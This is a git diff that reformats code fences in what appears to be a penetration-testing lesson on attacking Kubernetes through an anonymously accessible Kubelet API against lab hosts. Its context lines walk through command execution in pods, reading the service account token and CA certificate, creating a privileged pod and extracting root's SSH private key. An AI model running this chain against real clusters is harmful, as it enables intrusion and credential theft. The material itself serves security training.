@@ -94,8 +94,7 @@ In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By 
 
 #### K8's API Server Interaction
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k
 
 {
@@ -114,8 +113,7 @@ cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k
 
 #### Kubelet API - Extracting Pods
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .
 
 ...SNIP...
@@ -169,8 +167,7 @@ We can further analyze the pods with the following command:
 
 #### Kubeletctl - Extracting Pods
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods
 
 ┌────────────────────────────────────────────────────────────────────────────────┐
@@ -193,8 +190,7 @@ To effectively interact with pods within the Kubernetes environment, it's import
 
 #### Kubelet API - Available Commands
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
 
 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
@@ -214,8 +210,7 @@ It is also possible for us to engage with a container interactively and gain ins
 
 #### Kubelet API - Executing Commands
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
 
 uid=0(root) gid=0(root) groups=0(root)
@@ -231,8 +226,7 @@ To gain higher privileges and access the host system, we can utilize a tool call
 
 #### Kubelet API - Extracting Tokens
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
 
 eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
@@ -240,8 +234,7 @@ eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
 
 #### Kubelet API - Extracting Certificates
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
 
 -----BEGIN CERTIFICATE-----
@@ -256,8 +249,7 @@ Now that we have both the `token` and `certificate`, we can check the access rig
 
 #### List Privileges
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ export token=`cat k8.token`
 cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
 
@@ -272,8 +264,7 @@ Here we can see a few very important information. Besides the selfsubject-resour
 
 #### Pod YAML
 
-```
-        yaml
+```yaml
 apiVersion: v1
 kind: Pod
 metadata:
@@ -298,8 +289,7 @@ Once created, we can now create the new pod and check if it is running as expect
 
 #### Creating a new Pod
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
 
 pod/privesc created
@@ -315,8 +305,7 @@ If the pod is running we can execute the command and we could spawn a reverse sh
 
 #### Extracting Root's SSH Key
 
-```
-        shellsession
+```shellsession
 cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
 
 -----BEGIN OPENSSH PRIVATE KEY-----
